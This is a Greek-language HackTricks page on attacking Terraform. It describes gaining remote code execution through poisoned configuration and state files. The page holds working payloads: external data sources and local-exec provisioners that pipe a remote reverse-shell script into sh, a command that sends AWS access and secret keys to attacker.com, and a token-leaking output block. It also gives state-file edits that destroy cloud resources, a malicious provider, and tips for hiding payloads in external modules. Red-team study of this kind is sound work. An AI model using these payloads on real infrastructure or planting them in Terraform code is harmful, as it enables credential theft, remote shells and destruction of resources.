# Ασφάλεια Terraform

<details>

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκερ υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Βασικές Πληροφορίες

[Από τα έγγραφα:](https://developer.hashicorp.com/terraform/intro)

Το HashiCorp Terraform είναι ένα εργαλείο **υποδομής ως κώδικα** που σας επιτρέπει να ορίσετε τόσο **πόρους στο cloud όσο και on-prem** σε αρχεία ρυθμίσεων που μπορείτε να διαβάσετε, να επαναχρησιμοποιήσετε και να μοιραστείτε. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε ένα συνεπή ρεύμα εργασίας για την παροχή και διαχείριση όλης της υποδομής σας καθ' όλη τη διάρκεια του κύκλου ζωής της. Το Terraform μπορεί να διαχειριστεί συστατικά χαμηλού επιπέδου όπως υπολογιστές, αποθήκευση και δίκτυα, καθώς και συστατικά υψηλού επιπέδου όπως καταχωρήσεις DNS και χαρακτηριστικά SaaS.

### Πώς λειτουργεί το Terraform;

Το Terraform δημιουργεί και διαχειρίζεται πόρους σε πλατφόρμες cloud και άλλες υπηρεσίες μέσω των διεπαφών προγραμματισμού εφαρμογών τους (APIs). Οι παροχείς επιτρέπουν στο Terraform να λειτουργεί με σχεδόν οποιαδήποτε πλατφόρμα ή υπηρεσία με προσβάσιμο API.

![](<../.gitbook/assets/image (177).png>)

Η HashiCorp και η κοινότητα του Terraform έχουν ήδη γράψει **περισσότερους από 1700 παρόχους** για τη διαχείριση χιλιάδων διαφορετικών τύπων πόρων και υπηρεσιών, και αυτός ο αριθμός συνεχίζει να αυξάνεται. Μπορείτε να βρείτε όλους τους δημόσια διαθέσιμους παρόχους στο [Μητρώο Terraform](https://registry.terraform.io/), συμπεριλαμβανομένων των Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog και πολλών άλλων.

Η βασική ροή εργασίας του Terraform αποτελείται από τρία στάδια:

* **Εγγραφή:** Ορίζετε πόρους, οι οποίοι μπορεί να είναι σε πολλούς παρόχους cloud και υπηρεσίες. Για παράδειγμα, μπορείτε να δημιουργήσετε μια διαμόρφωση για την ανάπτυξη μιας εφαρμογής σε εικονικούς υπολογιστές σε ένα δίκτυο Virtual Private Cloud (VPC) με ομάδες ασφαλείας και έναν εξισορροπητή φορτίου.
* **Σχεδιασμός:** Το Terraform δημιουργεί ένα σχέδιο εκτέλεσης περιγράφοντας την υποδομή που θα δημιουργήσει, ενημερώσει ή καταστρέψει με βάση την υπάρχουσα υποδομή και τη διαμόρφωσή σας.
* **Εφαρμογή:** Με την έγκριση, το Terraform εκτελεί τις προτεινόμενες λειτουργίες με τη σωστή σειρά, σεβόμενο τυχόν εξαρτήσεις πόρων. Για παράδειγμα, αν ενημερώσετε τις ιδιότητες ενός VPC και αλλάξετε τον αριθμό των εικονικών μηχανών σε αυτό το VPC, το Terraform θα αναδημιουργήσει το VPC πριν από την κλιμάκωση των εικονικών μηχανών.

![](<../.gitbook/assets/image (215).png>)

## Εργαστήριο Terraform

Απλά εγκαταστήστε το terraform στον υπολογιστή σας.

Εδώ έχετε έναν [οδηγό](https://learn.hashicorp.com/tutorials/terraform/install-cli) και εδώ έχετε τον [καλύτερο τρόπο για να κατεβάσετε το terraform](https://www.terraform.io/downloads).

## RCE στο Terraform

Το Terraform **δεν έχει μια πλατφόρμα που εκθέτει μια ιστοσελίδα ή ένα δίκτυο υπηρεσίας** που μπορούμε να απαριθμήσουμε, επομένως, ο μόνος τρόπος να διακινδυνεύσουμε το terraform είναι να **είμαστε σε θέση να προσθέσουμε/τροποποιήσουμε αρχεία διαμόρφωσης του terraform**.

Ωστόσο, το terraform είναι ένα **πολύ ευαίσθητο στοιχείο** για να διακινδυνεύσετε επειδή θα έχει **προνομιακή πρόσβαση** σε διαφορετικές τοποθεσίες ώστε να μπορεί να λειτουργήσει σωστά.

Ο κύριος τρόπος για έναν επιτιθέμενο να μπορεί να διακινδυνεύσει το σύστημα όπου τρέχει το terraform είναι να **διακινδυνεύσει το αποθετήριο που αποθηκεύει τις διαμορφώσεις του terraform**, επειδή σε κάποιο σημείο θα **ερμηνευτούν**.

Πράγματι, υπάρχουν λύσεις εκεί έξω που **εκτελούν αυτόματα το terraform plan/apply μετά τη δημιουργία ενός PR**, όπως το **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Αν είστε σε θέση να διακινδυνεύσετε ένα αρχείο terraform υπάρχουν διαφορετικοί τρόποι με τους οποίους μπορείτε να πραγματοποιήσετε RCE όταν κάποιος εκτελεί `terraform plan` ή `terraform apply`.

### Terraform plan

Το terraform plan είναι η **πιο χρησιμοποιημένη εντολή** στο terraform και οι προγραμματιστές/λύσεις που χρησιμοποιούν το terraform την καλούν συνέχεια, οπότε ο **ευκολότερος τρόπος να πάρετε RCE** είναι να βεβαιωθείτε ότι δημιουργείτε ένα δηλητηριώδες αρχείο διαμόρφωσης terraform που θα εκτελέσει αυθαίρετες εντολές σε ένα `terraform plan`.

#### Χρησιμοποιώντας έναν εξωτερικό παροχέα

Το Terraform προσφέρει τον [πάροχο `external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs) που παρέχει έναν τρόπο διασύνδεσης μεταξύ του Terraform και εξωτερικών προγραμμάτων. Μπορείτε να χρησιμοποιήσετε την πηγή δεδομένων `external` για να εκτελέσετε αυθαίρετο κώδικα κατά τη διάρκεια ενός `plan`.

Ενσωματώνοντας σε ένα αρχείο διαμόρφωσης terraform κάτι παρόμοιο με το παρακάτω θα εκτελέσει ένα αντίστροφο κέλυφος όταν εκτελείτε `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Χρήση προσαρμοσμένου παροχέα

Ένας επιτιθέμενος θα μπορούσε να στείλει έναν [προσαρμοσμένο παροχέα](https://learn.hashicorp.com/tutorials/terraform/provider-setup) στο [Μητρώο Terraform](https://registry.terraform.io/) και στη συνέχεια να τον προσθέσει στον κώδικα Terraform σε ένα κλαδί χαρακτηριστικού ([παράδειγμα από εδώ](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Ο πάροχος κατεβάζεται στο `init` και θα εκτελέσει το κακόβουλο κώδικα όταν εκτελεστεί το `plan`.

Μπορείτε να βρείτε ένα παράδειγμα στο [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Χρησιμοποιώντας μια εξωτερική αναφορά

Και οι δύο επιλογές που αναφέρθηκαν είναι χρήσιμες αλλά όχι πολύ αόρατες (η δεύτερη είναι πιο αόρατη αλλά πιο περίπλοκη από την πρώτη). Μπορείτε να εκτελέσετε αυτήν την επίθεση ακόμα με έναν **πιο αόρατο τρόπο**, ακολουθώντας αυτές τις προτάσεις:

* Αντί να προσθέσετε τον αντίστροφο κέλυφος (rev shell) απευθείας στο αρχείο terraform, μπορείτε να **φορτώσετε έναν εξωτερικό πόρο** που περιέχει το αντίστροφο κέλυφος:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Μπορείτε να βρείτε τον κώδικα του αντιστρεπτικού κελύφους στο [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* Στο εξωτερικό πόρο, χρησιμοποιήστε το χαρακτηριστικό **ref** για να κρύψετε τον **κώδικα του αντιστρεπτικού κελύφους του Terraform σε ένα κλαδί** μέσα στο αποθετήριο, κάτι σαν: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Εφαρμογή Terraform

Η εφαρμογή του Terraform θα εκτελεστεί για να εφαρμοστούν όλες οι αλλαγές, μπορείτε επίσης να το καταχραστείτε για να λάβετε RCE εισάγοντας **ένα κακόβουλο αρχείο Terraform με** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Απλά χρειάζεται να βεβαιωθείτε ότι κάποιο φορτίο όπως τα παρακάτω τελειώνει στο αρχείο `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Ακολουθήστε τις **προτάσεις από την προηγούμενη τεχνική** για να εκτελέσετε αυτήν την επίθεση με έναν **πιο αθόρυβο τρόπο χρησιμοποιώντας εξωτερικές αναφορές**.

## Διαρροές Μυστικών

Μπορείτε να έχετε **μυστικές τιμές που χρησιμοποιούνται από το terraform να διαρρεύσουν** εκτελώντας το `terraform apply` προσθέτοντας στο αρχείο terraform κάτι σαν:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Κατάχρηση Αρχείων Κατάστασης του Terraform

Στην περίπτωση που έχετε πρόσβαση εγγραφής σε αρχεία κατάστασης του terraform αλλά δεν μπορείτε να αλλάξετε τον κώδικα του terraform, [**αυτή η έρευνα**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) παρέχει μερικές ενδιαφέρουσες επιλογές για να εκμεταλλευτείτε το αρχείο:

### Διαγραφή Πόρων <a href="#deleting-resources" id="deleting-resources"></a>

Υπάρχουν 2 τρόποι για την καταστροφή πόρων:

1. **Εισαγωγή ενός πόρου με ένα τυχαίο όνομα στο αρχείο κατάστασης που δείχνει στον πραγματικό πόρο προς καταστροφή**

Επειδή το terraform θα δει ότι ο πόρος δεν πρέπει να υπάρχει, θα τον καταστρέψει (ακολουθώντας το πραγματικό αναγνωριστικό του πόρου). Παράδειγμα από την προηγούμενη σελίδα:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Τροποποίηση του πόρου προς διαγραφή με έναν τρόπο ώστε να μην είναι δυνατή η ενημέρωσή του (έτσι θα διαγραφεί και θα αναδημιουργηθεί)**

Για ένα παράδειγμα EC2 instance, η τροποποίηση του τύπου της instance είναι αρκετή για να κάνει το terraform να τη διαγράψει και να την αναδημιουργήσει.

### RCE

Είναι επίσης δυνατόν να [δημιουργήσετε έναν προσαρμοσμένο πάροχο](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) και απλά να αντικαταστήσετε έναν από τους πάροχους στο αρχείο κατάστασης του terraform με τον κακόβουλο ή να προσθέσετε έναν κενό πόρο με τον κακόβουλο πάροχο. Παράδειγμα από την αρχική έρευνα:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## Αντικατάσταση αποκλεισμένου παροχέα

Σε περίπτωση που αντιμετωπίσετε μια κατάσταση όπου ο `hashicorp/external` έχει αποκλειστεί, μπορείτε να επαναυλοποιήσετε τον παροχέα `external` κάνοντας τα ακόλουθα. Σημείωση: Χρησιμοποιούμε ένα fork του παροχέα external που δημοσιεύτηκε από το https://registry.terraform.io/providers/nazarewk/external/latest. Μπορείτε επίσης να δημοσιεύσετε το δικό σας fork ή επαναυλοποίηση.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Τότε μπορείτε να χρησιμοποιήσετε το `external` όπως συνήθως.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Εργαλεία Ελέγχου

* [**tfsec**](https://github.com/aquasecurity/tfsec): Το tfsec χρησιμοποιεί στατική ανάλυση του κώδικα terraform σας για τον εντοπισμό πιθανών λαθών ρύθμισης.
* [**terascan**](https://github.com/tenable/terrascan): Το Terrascan είναι ένας αναλυτής κώδικα για τον κώδικα υποδομής ως κώδικα.

## Αναφορές

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκινγκ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}
